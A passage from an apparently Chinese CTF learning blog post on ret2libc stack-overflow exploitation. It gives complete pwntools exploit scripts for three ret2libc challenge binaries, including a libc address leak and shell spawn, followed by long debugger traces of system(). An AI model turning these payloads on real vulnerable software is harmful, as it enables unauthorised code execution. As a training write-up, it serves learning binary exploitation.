0x8049720</span><br><span class="line">p.recvuntil(&#x27;RET2LIBC &gt;_&lt;\n&#x27;)</span><br><span class="line">p.sendline(&#x27;a&#x27;*112 + p32(system_addr) + &#x27;aaaa&#x27; + p32(binsh_addr))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#ret2libc2</span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line">buf2_addr = 0x804a080</span><br><span class="line">gets_addr = 0x8048460</span><br><span class="line">system_addr = 0x8048490</span><br><span class="line">pop_ebx_addr = 0x0804843d</span><br><span class="line">p.recvuntil(&#x27;What do you think ?&#x27;)</span><br><span class="line">p.sendline(&#x27;a&#x27;*112 + p32(gets_addr) + p32(pop_ebx_addr) + p32(buf2_addr) + p32(system_addr) + &#x27;aaaa&#x27; + p32(buf2_addr))</span><br><span class="line">p.sendline(&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#ret2libc3</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">p = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">start_addr = 0x80484d0</span><br><span class="line">puts_plt_addr = 0x8048460</span><br><span class="line">libc_start_main_got_addr = 0x804a024</span><br><span class="line">p.recvuntil(&#x27;Can you find it !?&#x27;)</span><br><span class="line">p.sendline(&#x27;q&#x27;*112 + p32(puts_plt_addr) + p32(start_addr) + p32(libc_start_main_got_addr))</span><br><span class="line">libc_start_main_addr = u32(p.recv(4))</span><br><span class="line">print &quot;__libc_start_main_addr: &quot; + hex(libc_start_main_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span><br><span class="line">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;) + 0xb9</span><br><span class="line">print &quot;system_addr: &quot; + hex(system_addr)</span><br><span class="line">print &quot;binsh_addr: &quot; + hex(binsh_addr)</span><br><span class="line">p.recvuntil(&#x27;Can you find it !?&#x27;)</span><br><span class="line">p.sendline(&#x27;s&#x27;*112 + p32(system_addr) + &#x27;aaaa&#x27; + p32(binsh_addr))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1：&#x27;a&#x27;*112 + p32(system_addr) + &#x27;aaaa&#x27; + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">2：&#x27;a&#x27;*112 + p32(gets_addr) + p32(pop_ebx_addr) + p32(buf2_addr) + p32(system_addr) + &#x27;aaaa&#x27; + p32(buf2_addr)</span><br><span class="line"></span><br><span class="line">3：&#x27;q&#x27;*112 + p32(puts_plt_addr) + p32(start_addr) + p32(libc_start_main_got_addr)</span><br><span class="line">   &#x27;s&#x27;*112 + p32(system_addr) + &#x27;aaaa&#x27; + p32(binsh_addr)</span><br></pre></td></tr></table></figure><p>说真的，之前我还以为pwn没啥东西，就一个栈（ROP）、堆、整数、格式化字符串就没了，还打算学完pwn就去搞web，现在看来，我是小丑，一个基础ROP就搞得头皮发麻。</p><p>算了，得转换策略了，之后以刷题为主吧，ROP里的payload构造就那些东西，而且形式可以套用，即使不知道底层运作原理也能把题解出来，等以后工作的时候，研究了汇编再去想它的底层是如何运作的吧。</p><p>还是老老实实地做一个只会做pwn题的five比较好</p><p><img src="image-20220419224555435.png" alt="image-20220419224555435"></p><br/><br/><p>在程序的即将结束的前几步中，出现了esp指向/bin/sh这一我想要的结果</p><p><img src="image-20220420101612097.png" alt="image-20220420101612097"></p><br/><br/><h1 id="exp中payload分析1（请看这）"><a href="#exp中payload分析1（请看这）" class="headerlink" title="exp中payload分析1（请看这）"></a>exp中payload分析1（请看这）</h1><p>在经历了种种反复调试观察之后，我发现我也渐渐的熟练，这里再最后尝试一次，看能不能得出我想要的结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#plt、got寻找system函数部分的汇编代码</span><br><span class="line"></span><br><span class="line"> ► 0x8048683  &lt;main+107&gt;         mov    eax, 0</span><br><span class="line">   0x8048688  &lt;main+112&gt;         leave  </span><br><span class="line">   0x8048689  &lt;main+113&gt;         ret    </span><br><span class="line">    ↓</span><br><span class="line">   0x8048460  &lt;system@plt&gt;       jmp    dword ptr [system@got.plt]    &lt;0x804a018&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048466  &lt;system@plt+6&gt;     push   0x18</span><br><span class="line">   0x804846b  &lt;system@plt+11&gt;    jmp    0x8048420                     &lt;0x8048420&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x8048420                     push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br><span class="line">   0x8048426                     jmp    dword ptr [0x804a008]         &lt;0xf7f71b10&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7f71b10             endbr32 </span><br><span class="line">   0xf7f71b14             push   eax</span><br><span class="line">   0xf7f71b15             push   ecx</span><br><span class="line">   0xf7f71b16             push   edx</span><br><span class="line">   0xf7f71b17             mov    edx, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7f71b1b             mov    eax, dword ptr [esp + 0xc]</span><br><span class="line">   0xf7f71b1f             call   0xf7f6b7d0                    &lt;0xf7f6b7d0&gt;</span><br><span class="line"> </span><br><span class="line"> ► 0xf7f71b24             pop    edx</span><br><span class="line">   0xf7f71b25             mov    ecx, dword ptr [esp]</span><br><span class="line">   0xf7f71b28             mov    dword ptr [esp], eax</span><br><span class="line">   0xf7f71b2b             mov    eax, dword ptr [esp + 4]</span><br><span class="line">   0xf7f71b2f             ret    0xc</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91790 &lt;system&gt;    endbr32   </span><br></pre></td></tr></table></figure><p>plt、got查找system函数地址这一过程，我们搭配以下两张图</p><p><img src="image-20220420103058481.png" alt="image-20220420103058481"></p><p><img src="image-20220420102913339.png" alt="image-20220420102913339"></p><p>可以看到，我们调用plt、got表查找system函数的过程前后ebp、esp值保持不变，ok，所以调用plt、got表的过程对我们要研究的__exp中payload分析__没有任何影响</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([&#x27;a&#x27; * 112, system_plt, &#x27;b&#x27; * 4, binsh_addr])</span><br></pre></td></tr></table></figure><p>先依照刚进system函数的时候画一个栈图吧，如下：</p><p><img src="image-20220420105207728.png" alt="image-20220420105207728"></p><p><img src="image-20220420110329913.png" alt="image-20220420110329913"></p><p>自己画的栈图如下：到这，前置工作就算完成了</p><p><img src="image-20220420110711125.png" alt="image-20220420110711125"></p><br/><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line">#system函数部分的汇编代码</span><br><span class="line"></span><br><span class="line">   0xf7d91790 &lt;system&gt;       endbr32 </span><br><span class="line"> ► 0xf7d91794 &lt;system+4&gt;     call   __x86.get_pc_thunk.dx        &lt;__x86.get_pc_thunk.dx&gt;</span><br><span class="line">        arg[0]: 0x62626262 (&#x27;bbbb&#x27;)</span><br><span class="line">        arg[1]: 0x8048720 ◂— das     /* &#x27;/bin/sh&#x27; */</span><br><span class="line">        arg[2]: 0xff8b6b00 —▸ 0xf7f3b000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c</span><br><span class="line">        arg[3]: 0xff8b6b44 ◂— 0x0</span><br><span class="line"> </span><br><span class="line">   0xf7d91799 &lt;system+9&gt;     add    edx, 0x1a9867</span><br><span class="line">   0xf7d9179f &lt;system+15&gt;    sub    esp, 0xc</span><br><span class="line">   0xf7d917a2 &lt;system+18&gt;    mov    eax, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7d917a6 &lt;system+22&gt;    test   eax, eax</span><br><span class="line">   0xf7d917a8 &lt;system+24&gt;    je     system+40                    &lt;system+40&gt;</span><br><span class="line"> </span><br><span class="line">   0xf7d917aa &lt;system+26&gt;    add    esp, 0xc</span><br><span class="line">   0xf7d917ad &lt;system+29&gt;    jmp    do_system                    &lt;do_system&gt;</span><br><span class="line"></span><br><span class="line">#----------------------------------------------------------#</span><br><span class="line">   0xf7d917b2 &lt;system+34&gt;    lea    esi, [esi]</span><br><span class="line">   0xf7d917b8 &lt;system+40&gt;    lea    eax, [edx - 0x5cc95]</span><br><span class="line">#----------------------------------------------------------#</span><br><span class="line">   0xf7d917ad &lt;system+29&gt;       jmp    do_system                 &lt;do_system&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d911c0 &lt;do_system&gt;       push   ebp</span><br><span class="line">   0xf7d911c1 &lt;do_system+1&gt;     mov    ebp, eax</span><br><span class="line">   0xf7d911c3 &lt;do_system+3&gt;     push   edi                       &lt;0xf7f3b000&gt;</span><br><span class="line">   0xf7d911c4 &lt;do_system+4&gt;     call   __x86.get_pc_thunk.di     __x86.get_pc_thunk.di&gt;</span><br><span class="line">        arg[0]: 0xf7f3b000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c</span><br><span class="line">        arg[1]: 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">        arg[2]: 0x62626262 (&#x27;bbbb&#x27;)</span><br><span class="line">        arg[3]: 0x8048720 ◂— das     /* &#x27;/bin/sh&#x27; */</span><br><span class="line">        </span><br><span class="line">   0xf7d911c9 &lt;do_system+9&gt;     add    edi, 0x1a9e37</span><br><span class="line">   0xf7d911cf &lt;do_system+15&gt;    push   esi</span><br><span class="line">   0xf7d911d0 &lt;do_system+16&gt;    push   ebx</span><br><span class="line">   0xf7d911d1 &lt;do_system+17&gt;    sub    esp, 0x33c</span><br><span class="line">   0xf7d911d7 &lt;do_system+23&gt;    mov    eax, dword ptr gs:[0x14]</span><br><span class="line">   0xf7d911dd &lt;do_system+29&gt;    mov    dword ptr [esp + 0x32c], eax</span><br><span class="line">   0xf7d911e4 &lt;do_system+36&gt;    xor    eax, eax</span><br><span class="line">   0xf7d911e6 &lt;do_system+38&gt;    lea    ebx, [esp + 0x150]</span><br><span class="line">   0xf7d911ed &lt;do_system+45&gt;    lea    eax, [esp + 0x1d0]</span><br><span class="line">   0xf7d911f4 &lt;do_system+52&gt;    mov    dword ptr [esp + 0x1c], 0xffffffff</span><br><span class="line">   0xf7d911fc &lt;do_system+60&gt;    mov    dword ptr [esp + 0x150], 1</span><br><span class="line">   0xf7d91207 &lt;do_system+71&gt;    mov    dword ptr [esp + 0x1d4], 0</span><br><span class="line">   0xf7d91212 &lt;do_system+82&gt;    lea    esi, [esi]</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line"> ► 0xf7d91223 &lt;do_system+99&gt;  ✔ jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;  ✔ jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;  ✔ jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;  ✔ jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;  ✔ jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88              &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;  ✔ jne    do_system+88             &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;  ✔ jne    do_system+88             &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88             &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88             &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88             &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88             &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88             &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88             &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;    jne    do_system+88             &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;  ✔ jne    do_system+88            &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   0xf7d9121e &lt;do_system+94&gt;    sub    eax, 4</span><br><span class="line">   0xf7d91221 &lt;do_system+97&gt;    cmp    ebx, eax</span><br><span class="line">   0xf7d91223 &lt;do_system+99&gt;  ✔ jne    do_system+88            &lt;do_system+88&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7d91218 &lt;do_system+88&gt;    mov    dword ptr [eax], 0</span><br><span class="line">   ...</span><br><span class="line">   ...</span><br><span class="line">   ...</span><br><span class="line">   后面基本都是循环，感觉全列出来意义不大</span><br></pre></td></tr></table></figure><p>ok，接下来找关键汇编代码就行，&lt;system+4&gt;中我们可以看到这句：__arg[1]: 0x8048720 ◂— das     /* ‘/bin/sh’ */__，这里将esp往上的四个地址中的数据当成参数传给system函数，这里我们也可以猜测system会根据第二个参数__arg[1]__执行相关的操作（个人理解，不对的话请恳大佬指正，wx：xy1724252720）【ok，在调了之后的过程后发现猜测有误】</p><p>何为关键汇编，我这里找的是能使ebp发生改变或使esp往高地址指的关键pop等操作</p><p>1、执行了一次函数头，其实好办了，我们接着去找函数尾的标志（leave、retn）</p><p><img src="image-20220420112048550.png" alt="image-20220420112048550"></p><p>2、执行到程序结束也没看到连在一起的leave和retn指令</p><p><img src="image-20220420155856813.png" alt="image-20220420155856813"></p><p>3、同时我们看看我们的ebp和esp，</p><p><img src="image-20220420160233130.png" 